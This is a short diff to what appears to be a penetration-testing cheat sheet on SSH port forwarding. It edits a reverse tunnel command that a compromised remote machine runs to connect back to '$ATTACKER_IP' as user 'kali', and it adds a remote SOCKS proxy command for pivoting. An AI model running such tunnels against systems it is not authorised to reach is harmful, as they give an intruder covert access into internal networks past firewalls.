@@ -17,15 +17,20 @@ ssh -N -f -L $PORT:localhost:$PORT $USER@$TARGET_IP
 Forward port from remote machine to local machine:
 
 ```bash
-service ssh start
+sudo service ssh start
 ```
 
 then on remote machine
 
 ```bash
-ssh -N -R $REMOTE_PORT:localhost:$PORT $USER@$ATTACKER_IP
+ssh -N -R $REMOTE_PORT:localhost:$PORT kali@$ATTACKER_IP
 ```
 
+or start dynamic port forwarding (socks5 proxy) on localhost:
+
+```bash
+ssh -N -R 9998 kali@$LOCAL_IP
+```
 Proxy on localhost:9090 using SSH and credentials:
 (WARNING: Proxy is very unstable if it cannot resolve a host, e.g. http page includes)
 ```bash
